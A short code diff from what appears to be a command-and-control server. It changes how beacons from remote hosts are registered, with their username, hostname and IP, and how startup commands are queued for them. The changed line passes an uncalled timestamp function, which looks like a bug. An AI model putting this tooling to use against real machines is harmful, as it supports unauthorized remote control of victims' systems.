@@ -10,14 +10,13 @@ class Pulse:
     def process(post_data, remote_ip, channel='http'):
         becon_exists = Existance.beacon(post_data['beacon_id'])
         if becon_exists['result'] == "failed":
-            save_first_beacon = Pulse.first_beacon(post_data, remote_ip)
             create_beacon = Beacon.create(post_data['beacon_id'], post_data['platform'],
                 post_data['username'], post_data['timer'], post_data['hostname'], 
                 post_data['data'], post_data['working_dir'], remote_ip)
+
             startup_tasks = StartupTasks.objects(platform=post_data['platform'])
             for tasks in startup_tasks:
-                task_id = Random.create(10)
-                create_tasks = Tasks.create(beacon_id, tasks.command.name, tasks.input, task_id)
+                create_tasks = Task.create(post_data['beacon_id'], tasks.commands, datetime.datetime.now)
 
         if post_data['timer'] is not None:
             new_timer = float(post_data['timer'])
